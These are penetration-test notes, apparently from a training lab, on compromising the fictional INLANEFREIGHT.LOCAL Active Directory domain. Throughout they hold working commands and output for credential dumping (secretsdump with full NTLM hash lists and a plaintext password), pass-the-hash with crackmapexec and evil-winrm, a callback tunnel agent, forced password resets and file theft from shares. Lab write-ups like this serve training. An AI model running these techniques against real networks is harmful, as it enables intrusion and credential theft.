# AD Enumeration - Extracted Evidence

Compiled from ACME-IPT engagement notes (Attacking Enterprise Networks vault).

---

### #### **Host Discovery - 172.16.8.0/23 Subnet - SSH Tunnel**
_Source: Internal-Testing, line ~304_

```
# ./nmap --open -iL live_hosts 

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-06-22 01:42 UTC
Unable to find nmap-services! Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.

Nmap scan report for 172.16.8.3
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00064s latency).
Not shown: 1173 closed ports
PORT    STATE SERVICE
53/tcp  open  domain
88/tcp  open  kerberos
135/tcp open  epmap
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds
464/tcp open  kpasswd
593/tcp open  unknown
636/tcp open  ldaps
MAC Address: 00:50:56:B9:16:51 (Unknown)

Nmap scan report for 172.16.8.20
Host is up (0.00037s latency).
Not shown: 1175 closed ports
PORT     STATE SERVICE
80/tcp   open  http
111/tcp  open  sunrpc
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:B9:EC:36 (Unknown)

Nmap scan report for 172.16.8.50
Host is up (0.00038s latency).
Not shown: 1177 closed ports
PORT     STATE SERVICE
135/tcp  open  epmap
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
8080/tcp open  http-alt
MAC Address: 00:50:56:B9:B0:89 (Unknown)

```

---

### #### **Active Directory Quick Hits - SMB NULL SESSION**
_Source: Internal-Testing, line ~361_

```
┌──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ proxychains4 enum4linux-ng -A 172.16.8.3
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
ENUM4LINUX - next generation (v1.3.10)

[proxychains] DLL init: proxychains-ng 4.17
 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 172.16.8.3
[*] Username ......... ''
[*] Random Username .. 'nbyrjvzd'
[*] Password ......... ''
[*] Timeout .......... 10 second(s)

 ===================================
|    Listener Scan on 172.16.8.3    |
 ===================================
[*] Checking LDAP
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:389  ...  OK
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:636  ...  OK
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:139  ...  OK
[+] SMB over NetBIOS is accessible on 139/tcp

 ==================================================
|    Domain Information via LDAP for 172.16.8.3    |
 ==================================================
[*] Trying LDAP
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:389  ...  OK
[+] Appears to be root/parent DC
[+] Long domain name is: INLANEFREIGHT.LOCAL

 =========================================================
|    NetBIOS Names and Workgroup/Domain for 172.16.8.3    |
 =========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =======================================
|    SMB Dialect Check on 172.16.8.3    |
 =======================================
[*] Trying on 445/tcp
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[+] Supported dialects and settings:
Supported dialects:                                                                                                 
  SMB 1.0: false                                                                                                    
  SMB 2.0.2: true                                                                                                   
  SMB 2.1: true                                                                                                     
  SMB 3.0: true                                                                                                     
  SMB 3.1.1: true                                                                                                   
Preferred dialect: SMB 3.0                                                                                          
SMB1 only: false                                                                                                    
SMB signing required: true                                                                                          

 =========================================================
|    Domain Information via SMB session for 172.16.8.3    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[+] Found domain information via SMB
NetBIOS computer name: DC01                                                                                         
NetBIOS domain name: INLANEFREIGHT                                                                                  
DNS domain: INLANEFREIGHT.LOCAL                                                                                     
FQDN: DC01.INLANEFREIGHT.LOCAL                                                                                      
Derived membership: domain member                                                                                   
Derived domain: INLANEFREIGHT                                                                                       

 =======================================
|    RPC Session Check on 172.16.8.3    |
 =======================================
[*] Check for anonymous access (null session)
[+] Server allows authentication via username '' and password ''
[*] Check for guest access
[-] Could not establish guest session: STATUS_LOGON_FAILURE

 =================================================
|    Domain Information via RPC for 172.16.8.3    |
 =================================================
[+] Domain: INLANEFREIGHT
[+] Domain SID: S-1-5-21-2814148634-3729814499-1637837074
[+] Membership: domain member

 =============================================
|    OS Information via RPC for 172.16.8.3    |
 =============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016                                                            
OS version: '10.0'                                                                                                  
OS release: '1809'                                                                                                  
OS build: '17763'                                                                                                   
Native OS: not supported                                                                                            
Native LAN manager: not supported                                                                                   
Platform id: null                                                                                                   
Server type: null                                                                                                   
Server type string: null                                                                                            

 ===================================
|    Users via RPC on 172.16.8.3    |
 ===================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 ====================================
|    Groups via RPC on 172.16.8.3    |
 ====================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 ====================================
|    Shares via RPC on 172.16.8.3    |
 ====================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 =======================================
|    Policies via RPC for 172.16.8.3    |
 =======================================
[*] Trying port 445/tcp
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:445  ...  OK
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.3:139  ...  OK
[-] SMB connection error on port 139/tcp: session failed

 =======================================
|    Printers via RPC for 172.16.8.3    |
 =======================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 38.33 seconds

```

---

### #### **Exploitation & Privilege Escalation**
_Source: Internal-Testing, line ~672_

```
subzeroxi11@htb[/htb]$ secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE

Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xb3a720652a6fca7e31c1659e3d619944
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<redacted>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mpalledorous:1001:aad3b435b51404eeaad3b435b51404ee:3bb874a52ce7b0d64ee2a82bbf3fe1cc:::
[*] Dumping cached domain logon information (domain/username:hash)
INLANEFREIGHT.LOCAL/hporter:$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:3e002600200046005a003000460021004b00460071002e002b004d0042005000480045002e006c00280078007900580044003b0050006100790033006e002a0047004100590020006e002d00390059003b0035003e0077005d005f004b004900400051004e0062005700440074006b005e0075004000490061005d006000610063002400660033003c0061002b0060003900330060006a00620056006e003e00210076004a002100340049003b00210024005d004d006700210051004b002e004f007200290027004c00720030005600760027004f0055003b005500640061004a006900750032006800540033006c00
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:cb8a6327fc3dad4ea7c84b88c7542e7c
[*] DefaultPassword 
(Unknown User):Gr8hambino!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6968d50f5ec2bc41bc207a35f0392b72bb083c22
dpapi_userkey:0xe1e7a8bc8273395552ae8e23529ad8740d82ea92
[*] NL$KM 
 0000   21 0C E6 AC 8B 08 9B 39  97 EA D9 C6 77 DB 10 E6   !......9....w...
 0010   2E B2 53 43 7E B8 06 64  B3 EB 89 B1 DA D1 22 C7   ..SC~..d......".
 0020   11 83 FA 35 DB 57 3E B0  9D 84 59 41 90 18 7A 8D   ...5.W>...YA..z.
 0030   ED C9 1C 26 FF B7 DA 6F  02 C9 2E 18 9D CA 08 2D   ...&...o.......-
NL$KM:210ce6ac8b089b3997ead9c677db10e62eb253437eb80664b3eb89b1dad122c71183fa35db573eb09d84594190187a8dedc91c26ffb7da6f02c92e189dca082d
[*] Cleaning up...
```

---

### #### **Exploitation & Privilege Escalation**
_Source: Internal-Testing, line ~706_

```

subzeroxi11@htb[/htb]$ proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H <redacted>

ProxyChains-3.1 (http://proxychains.sf.net)
[*] Initializing LDAP protocol database
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:135-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-AEN-DEV) (domain:ACADEMY-AEN-DEV) (signing:False) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8081-<><>-172.16.8.20:445-<><>-OK
SMB         172.16.8.20     445    ACADEMY-AEN-DEV  [+] ACADEMY-AEN-DEV\administrator <redacted> (Pwn3d!)
```

---

### #### **Exploitation & Privilege Escalation**
_Source: Internal-Testing, line ~725_

```
┌──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks]
└─$ proxychains evil-winrm -i 172.16.8.20  -u administrator -H 0e20798f695ab0d04bc138b22344cea8
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir


    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/1/2022  12:04 PM                WindowsPowerShell


*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../
*Evil-WinRM* PS C:\Users\Administrator> cd \Desktop
Cannot find path 'C:\Desktop' because it does not exist.
At line:1 char:1
+ cd \Desktop
+ ~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Desktop:String) [Set-Location], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:8081  ...  172.16.8.20:5985  ...  OK
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/22/2022   9:05 PM             17 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
K33p_0n_sp00fing!
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 

```

---

### #### **Exploitation & Privilege Escalation**
_Source: Internal-Testing, line ~782_

```
        cmd
c:\DotNetNuke\Portals\0> net user hporter /dom
net user hporter /dom

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

User name                    hporter
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/1/2022 11:32:05 AM
Password expires             Never
Password changeable          6/1/2022 11:32:05 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/21/2022 7:03:10 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.

```

---

### (no section header)
_Source: AD-Compromise, line ~13_

```
PS C:\DotNetNuke\Portals\0> Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=ttimmons)(name=ttimmons)(displayname=ttimmons))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'acmetesting/LEGIT' for object 'ttimmons
```

---

### (no section header)
_Source: AD-Compromise, line ~117_

```
PS C:\DotNetNuke\Portals\0> $group = Convert-NameToSid "Server Admins"
PS C:\DotNetNuke\Portals\0> Add-DomainGroupMember -Identity $group -Members 'ttimmons' -Credential $timcreds -verbose
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'ttimmons' to group 'S-1-5-21-2814148634-3729814499-1637837074-1622'
```

---

### (no section header)
_Source: AD-Compromise, line ~125_

```
──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks/ligolo]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm                                     
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:b9362dfa5abf924b0d172b8c49ab58ac:::
inlanefreight.local\avazquez:1716:aad3b435b51404eeaad3b435b51404ee:762cbc5ea2edfca03767427b2f2a909f:::
inlanefreight.local\pfalcon:1717:aad3b435b51404eeaad3b435b51404ee:f8e656de86b8b13244e7c879d8177539:::
inlanefreight.local\fanthony:1718:aad3b435b51404eeaad3b435b51404ee:9827f62cf27fe221b4e89f7519a2092a:::
inlanefreight.local\wdillard:1719:aad3b435b51404eeaad3b435b51404ee:69ada25bbb693f9a85cd5f176948b0d5:::
inlanefreight.local\lbradford:1720:aad3b435b51404eeaad3b435b51404ee:0717dbc7b0e91125777d3ff4f3c00533:::
inlanefreight.local\sgage:1721:aad3b435b51404eeaad3b435b51404ee:31501a94e6027b74a5710c90d1c7f3b9:::
inlanefreight.local\asanchez:1722:aad3b435b51404eeaad3b435b51404ee:c6885c0fa57ec94542d362cf7dc2d541:::
inlanefreight.local\dbranch:1723:aad3b435b51404eeaad3b435b51404ee:a87c92932b0ef15f6c9c39d6406c3a75:::
inlanefreight.local\ccruz:1724:aad3b435b51404eeaad3b435b51404ee:a9be3a88067ed776d0e2cf4ccde8ec8f:::
inlanefreight.local\njohnson:1725:aad3b435b51404eeaad3b435b51404ee:1b2a9f3b6d785e695aadfe3485a2601f:::
inlanefreight.local\mholliday:1726:aad3b435b51404eeaad3b435b51404ee:a87c92932b0ef15f6c9c39d6406c3a75:::
inlanefreight.local\mshoemaker:1727:aad3b435b51404eeaad3b435b51404ee:c15d04d9a989b3c9f1d2db979ffa325f:::
inlanefreight.local\aslater:1728:aad3b435b51404eeaad3b435b51404ee:e7d0a88542cb44ab48e5a89d864f8146:::
inlanefreight.local\kprentiss:1729:aad3b435b51404eeaad3b435b51404ee:9b12a0a33aabdbd845cd3ed5070820b9:::
inlanefreight.local\gdavis:1730:aad3b435b51404eeaad3b435b51404ee:1ab3ee9bd2e35ad25670481d9d1b4e0f:::
inlanefreight.local\jmcdaniel:1731:aad3b435b51404eeaad3b435b51404ee:1e22653293daff337f58d32695c999d0:::
inlanefreight.local\jjones:1732:aad3b435b51404eeaad3b435b51404ee:a90431144f59bc8aeecc28038d6bda40:::
inlanefreight.local\tgarcia:1733:aad3b435b51404eeaad3b435b51404ee:8a4c52fc75514ddb740971e26b9311d9:::
inlanefreight.local\mharrison:1734:aad3b435b51404eeaad3b435b51404ee:4befb46af523d5899f605eb13fa91788:::
inlanefreight.local\nhight:1735:aad3b435b51404eeaad3b435b51404ee:9dbd90a7155594a3950791b2a20b90dd:::
inlanefreight.local\wbaird:1736:aad3b435b51404eeaad3b435b51404ee:f30ba55f393d631be27cc76b385af8f9:::

```

---

### (no section header)
_Source: AD-Compromise, line ~159_

```

┌──(kali㉿kali)-[~/HTB/CPTS/Attacking_Enterprise_Networks/ligolo]
└─$ evil-winrm -i 172.16.8.3'  -u Administrator -H 'fd1f7e5564060258ea787ddbb6e6afa2                                                      

Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

```

---

### #### **Hunting for Sensitive Data/Hosts**
_Source: Post-Exploitation, line ~22_

```
─$ evil-winrm -i 172.16.8.3  -u Administrator -H 'fd1f7e5564060258ea787ddbb6e6afa2'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd "c:\Department Shares\IT\Networking"
*Evil-WinRM* PS C:\Department Shares\IT\Networking> dir


    Directory: C:\Department Shares\IT\Networking


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/11/2026   4:52 AM        7302656 agent.exe


*Evil-WinRM* PS C:\Department Shares\IT\Networking> .\agent.exe -connect 172.16.8.120:11601 -ignore-cert
agent.exe : time="2026-07-11T05:26:38-07:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2026-07-1...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2026-07-11T05:26:38-07:00" level=info msg="Connection established" addr="172.16.8.120:11601"

```

---

### #### **Hunting for Sensitive Data/Hosts**
_Source: Post-Exploitation, line ~66_

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> 1..100 | % {"172.16.9.$($_): $(Test-Connection -count 1 -comp 172.16.9.$($_) -quiet)"}
172.16.9.1: False
172.16.9.2: False
172.16.9.3: True
172.16.9.4: False
172.16.9.5: False
172.16.9.6: False
172.16.9.7: False
172.16.9.8: False
172.16.9.9: False
172.16.9.10: False
172.16.9.11: False
172.16.9.12: False
172.16.9.13: False
172.16.9.14: False
172.16.9.15: False

```

---

### #### **Hunting for Sensitive Data/Hosts**
_Source: Post-Exploitation, line ~86_

```
Evil-WinRM* PS C:\Department Shares\IT\Private\Networking> download "C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa" /tmp/ssmallsadm-id_rsa 

Info: Downloading C:\Department Shares\IT\Private\Networking\ssmallsadm-id_rsa to /tmp/ssmallsadm-id_rsa

|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:5985-<><>-OK
                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Department Shares\IT\Private\Networking>
```

---

### #### **Hunting for Sensitive Data/Hosts**
_Source: Post-Exploitation, line ~160_

```
*Evil-WinRM* PS C:\Department Shares\IT\Networking> .\agent.exe -connect 172.16.8.120:11601 -ignore-cert
agent.exe : time="2026-07-11T05:26:38-07:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2026-07-1...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2026-07-11T05:26:38-07:00" level=info msg="Connection established" addr="172.16.8.120:11601"

```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~10_

```
c:\DotNetNuke\Portals\0> SharpHound.exe -c All

2022-06-22T10:02:32.2363320-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-22T10:02:32.2519575-07:00|INFORMATION|Initializing SharpHound at 10:02 AM on 6/22/2022
2022-06-22T10:02:32.5800848-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2022-06-22T10:02:32.7675820-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL
2022-06-22T10:03:03.3301538-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 46 MB RAM
2022-06-22T10:03:16.9238698-07:00|WARNING|[CommonLib LDAPUtils]Error getting forest, ENTDC sid is likely incorrect
2022-06-22T10:03:18.1426009-07:00|INFORMATION|Producer has finished, closing LDAP channel
2022-06-22T10:03:18.1582366-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2022-06-22T10:03:18.6738528-07:00|INFORMATION|Consumers finished, closing output channel
2022-06-22T10:03:18.7050961-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2022-06-22T10:03:18.8769905-07:00|INFORMATION|Status: 3641 objects finished (+3641 79.15218)/s -- Using 76 MB RAM
2022-06-22T10:03:18.8769905-07:00|INFORMATION|Enumeration finished in 00:00:46.1149865
2022-06-22T10:03:19.1582443-07:00|INFORMATION|SharpHound Enumeration Completed at 10:03 AM on 6/22/2022! Happy Graphing!

```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~66_

```
c:\DotNetNuke\Portals\0> net use

New connections will be remembered.


Status       Local     Remote                    Network

-------------------------------------------------------------------------------
                       \\TSCLIENT\home           Microsoft Terminal Services
The command completed successfully.


c:\DotNetNuke\Portals\0> copy \\TSCLIENT\home\PowerView.ps1 .
        1 file(s) copied.

```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~85_

```
        
PS C:\DotNetNuke\Portals\0> Import-Module .\PowerView.ps1

PS C:\DotNetNuke\Portals\0> Set-DomainUserPassword -Identity ssmalls -AccountPassword (ConvertTo-SecureString 'Str0ngpass86!' -AsPlainText -Force ) -Verbose

VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'ssmalls'
VERBOSE: [Set-DomainUserPassword] Password for user 'ssmalls' successfully reset
```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~96_

```

subzeroxi11@htb[/htb]$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86!

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86!
```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~135_

```
$ proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
SMB         172.16.8.3      445    DC01             [+] INLANEFREIGHT.LOCAL\ssmalls:Str0ngpass86! 
SPIDER_P... 172.16.8.3      445    DC01             [*] Started spidering plus with option:
SPIDER_P... 172.16.8.3      445    DC01             [*]        DIR: ['print$']
SPIDER_P... 172.16.8.3      445    DC01             [*]        EXT: ['ico', 'lnk']
SPIDER_P... 172.16.8.3      445    DC01             [*]       SIZE: 51200
SPIDER_P... 172.16.8.3      445    DC01             [*]     OUTPUT: /tmp/cme_spider_plus
```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~179_

```
subzeroxi11@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/Department Shares' 

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
Enter WORKGROUP\ssmalls's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  1 14:34:06 2022
  ..                                  D        0  Wed Jun  1 14:34:06 2022
  Accounting                          D        0  Wed Jun  1 14:34:08 2022
  Executives                          D        0  Wed Jun  1 14:34:04 2022
  Finance                             D        0  Wed Jun  1 14:34:00 2022
  HR                                  D        0  Wed Jun  1 14:33:48 2022
  IT                                  D        0  Wed Jun  1 14:33:42 2022
  Marketing                           D        0  Wed Jun  1 14:33:56 2022
  R&D                                 D        0  Wed Jun  1 14:33:52 2022

        10328063 blocks of size 4096. 8177952 blocks available
```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~245_

```
        
     },
       "INLANEFREIGHT.LOCAL/scripts/adum.vbs": {
           "atime_epoch": "2022-06-01 14:34:41",
           "ctime_epoch": "2022-06-01 14:34:41",
           "mtime_epoch": "2022-06-01 14:34:39",
           "size": "32.15 KB"

```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~257_

```
        
subzeroxi11@htb[/htb]$ proxychains smbclient -U ssmalls '//172.16.8.3/sysvol' 

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:8083-<><>-172.16.8.3:445-<><>-OK
Enter WORKGROUP\ssmalls's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  1 14:10:57 2022
  ..                                  D        0  Wed Jun  1 14:10:57 2022
  INLANEFREIGHT.LOCAL                Dr        0  Wed Jun  1 14:10:57 2022
smb: \INLANEFREIGHT.LOCAL\> cd scripts
smb: \INLANEFREIGHT.LOCAL\scripts\> ls
  .                                   D        0  Wed Jun  1 14:34:41 2022
  ..                                  D        0  Wed Jun  1 14:34:41 2022
  adum.vbs                            A    32921  Wed Jun  1 14:34:39 2022

        10328063 blocks of size 4096. 8177920 blocks available
smb: \INLANEFREIGHT.LOCAL\scripts\> get adum.vbs 
getting file \INLANEFREIGHT.LOCAL\scripts\adum.vbs of size 32921 as adum.vbs (57.2 KiloBytes/sec) (average 57.2 KiloBytes/sec)
```

---

### #### **Lateral Movement**
_Source: Lateral-Movement, line ~283_

```
subzeroxi11@htb[/htb]$ cat adum.vbs 

Option Explicit

''=================================================================================================================================
''
'' Active Directory User Management script [ADUM]
''
'' Written: 2011/07/18
'' Updated: 2015.07.21

<SNIP>

Const cSubject = "Active Directory User Management report"  'EMAIL - SUBJECT LINE

